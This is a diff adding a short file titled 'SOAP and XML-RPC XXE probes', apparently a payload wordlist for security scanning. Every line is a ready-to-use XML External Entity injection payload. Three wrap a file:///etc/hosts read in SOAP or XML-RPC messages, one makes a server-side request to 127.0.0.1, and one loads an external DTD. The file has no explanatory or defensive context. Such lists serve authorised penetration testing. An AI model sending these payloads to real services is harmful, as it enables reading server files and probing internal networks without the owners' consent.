@@ -1,0 +1,6 @@
+# SOAP and XML-RPC XXE probes
+<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>
+<?xml version="1.0"?><!DOCTYPE methodCall [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><methodCall><methodName>&xxe;</methodName></methodCall>
+<?xml version="1.0"?><!DOCTYPE methodResponse [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><methodResponse><params><param><value>&xxe;</value></param></params></methodResponse>
+<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><x>&xxe;</x></soap:Body></soap:Envelope>
+<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://127.0.0.1/xxe.dtd">%dtd;]><x/>
